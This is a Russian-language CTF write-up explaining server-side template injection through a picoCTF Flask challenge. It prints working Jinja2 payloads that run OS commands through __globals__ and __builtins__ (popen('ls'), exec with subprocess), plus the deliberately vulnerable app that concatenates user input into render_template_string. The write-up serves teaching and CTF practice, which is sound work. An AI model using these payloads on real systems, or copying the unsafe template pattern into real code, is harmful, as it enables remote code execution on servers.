# Server-Side Template Injection (SSTI)

SSTI - уязвимость, нацеленная на шаблонизаторы динамической генерации контекста. В настоящее время шаблонизаторы редко используются в рендеринге веб-страниц (так как рендеринг обычно происходит на стороне клиента), но их можно встретить в системах создания почтовых рассылок и генерации конфигурационных файлов.

## Пример уязвимости SSTI (picoCTF)

Рассмотрим элементарный пример SSTI уязвимости с [picoCTF](https://play.picoctf.org/practice/challenge/492?category=1&page=1).

### Описание уязвимости

В задании представлен веб-сайт с окном ввода. С помощью вкладки Network в консоли разработчика можно определить, что веб-приложение использует Python.

![Screenshot of Network tab showing Python backend](ссылка_на_фото_если_есть)

### Эксплуатация уязвимости

Классическая эксплуатация SSTI в Python использует следующий payload:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

Этот код выведет список файлов в текущей директории. Среди них находится файл с флагом для сдачи задания. Для просмотра исходного кода приложения можно использовать:
```
cat app.py
```

### Исходный код уязвимого приложения

```python
from flask import Flask, render_template_string, request, redirect

app = Flask(__name__)

@app.route('/', methods = ['GET', 'POST'])
def home():
    if request.method == 'POST':
        return redirect('/announce', code=307)
    else:
        return render_template_string("""
            <!doctype html>
            <title>SSTI1</title>
            <h1> Home </h1>
            <p> I built a cool website that lets you announce whatever you want!* </p>
            <form action="/" method="POST">
                What do you want to announce: <input name="content" id="announce">
                <button type="submit"> Ok </button>
            </form>
            <p style="font-size:10px;position:fixed;bottom:10px;left:10px;">
                *Announcements may only reach yourself
            </p>
            """)

@app.route("/announce", methods = ["POST"])
def announcement():
    return render_template_string("""
        <!doctype html>
        <h1 style="font-size:100px;" align="center">""" + request.form.get("content", "") + """</h1>
        """, )
```

### Анализ уязвимости
Нас интересует функция `announcement()`: в ней введенные данные пользователя (форма `request.form.get("content", "")`) передаются напрямую в функцию `home()` - следовательно, отправляются на сервер веб-приложения (функция `home()` использует метод POST). 
Сам Python шелл (как в примере выше, так и вообще) использует вызов дополнительных модулей для доступа к shell ОС сервера. Шаблонизатор Python, в свою очередь, обрабатывает управляющие конструкции и выражения, которые могут содержать код, вроде нашего. Уязвимость SSTI появляется при прямой передаче вводимых данных, которые обработает шаблонизатор уже на стороне сервера. Иными словами, вводимые пользователем данные не должны использоваться как часть шаблонизатора.
Далеко не все шаблонизаторы допускают ввод произвольного кода, но не из за безопасности, а из за собственной реализации: к примеру, у Jinja2 нет управляющей конструкции для ввода, как в примере CTF задания выше. Так, в Jinja2 у атакующего нет доступа к глобальным переменным (типа _main_) или переменным, которые не объявлены в шаблоне, но есть особенность. Парадоксально, но данный шаблонизатор при вызове класса jinja2.runtime.Undefined сам "предоставляет" доступ к необъявленным переменным, если обратиться к ним - в выводе он просто оставит пустую строку, и к этой строке присваивается значение объекта <class 'jinja2.runtime.Undefined'>. Пользуясь этой логикой, атакующий может использовать _init_ для выхода из текущей области, затем - _globals_ для обращения к глобальным переменным, и наконец - к _builtins_ для обращения к встроенным функциям и классам Python. В результате будет получен доступ к exec и import, которые и требуются для эксплуатации.
В качестве PoC можно привести следующий код:
`{{application.__init__.__globals__.__builtins__.exec('import subprocess; subprocess.run([\"python3\", \"--version\"], stdout=1)')}}`
